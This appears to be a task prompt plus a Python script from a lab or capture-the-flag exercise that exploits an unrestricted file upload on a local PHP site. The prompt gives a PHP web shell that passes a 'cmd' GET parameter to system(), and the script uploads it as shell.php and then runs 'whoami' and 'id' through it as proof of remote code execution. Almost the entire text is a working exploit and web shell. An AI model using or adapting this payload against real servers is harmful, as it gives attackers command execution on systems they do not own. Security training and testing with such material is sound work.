Create and upload a PHP web shell to achieve RCE on the target http://127.0.0.1:32945

The target has an unrestricted file upload vulnerability at /index.php with form field name 'userfile'. Uploaded PHP files are stored at /upload/{filename} and executed.

1. Create a simple PHP shell payload using system() function
e.g., `<?php if(isset($_GET['cmd'])){ echo "<pre>"; system($_GET['cmd']); echo "</pre>"; } ?>`

2. Use requests library to upload the shell to http://127.0.0.1:32945/index.php with:
   - multipart/form-data encoding
   - file field name: 'userfile'
   - filename: 'shell.php'
   - submit button name: 'submit'

3. Verify the shell works by making a GET request to:
   http://127.0.0.1:32945/upload/shell.php?cmd=whoami

4. Return the shell filename and the command output as proof of successful RCE

import requests

# Target URLs
upload_url = 'http://127.0.0.1:32945/index.php'
shell_url = 'http://127.0.0.1:32945/upload/shell.php'

# Simple PHP shell that executes commands via GET parameter
shell_payload = '''<?php if(isset($_GET['cmd'])){ echo "<pre>"; system($_GET['cmd']); echo "</pre>"; } ?>'''

# Step 1: Upload the PHP shell
# Using multipart/form-data with the correct field names from context
files = {
    'userfile': ('shell.php', shell_payload, 'application/x-php')
}
data = {
    'submit': 'Upload Image'
}

print("[+] Uploading PHP shell to", upload_url)
upload_response = requests.post(upload_url, files=files, data=data)
print(f"[+] Upload Status: {upload_response.status_code}")
print(f"[+] Upload Response length: {len(upload_response.text)}B")

# Step 2: Verify the shell executes by running 'whoami' command
print("\n[+] Testing shell execution with 'whoami' command")
cmd_url = f"{shell_url}?cmd=whoami"
exec_response = requests.get(cmd_url)
print(f"[+] Shell Status: {exec_response.status_code}")
print(f"[+] Command Output:")
print(exec_response.text)

# Step 3: Additional command to confirm full RCE
print("\n[+] Testing with additional command: 'id'")
cmd_url2 = f"{shell_url}?cmd=id"
exec_response2 = requests.get(cmd_url2)
print(f"[+] Command Output:")
print(exec_response2.text)

print("\n[+] RCE SUCCESS - Shell uploaded and executing commands")
print(f"[+] Shell Location: /upload/shell.php")
print(f"[+] Access URL: {shell_url}?cmd=<command>")

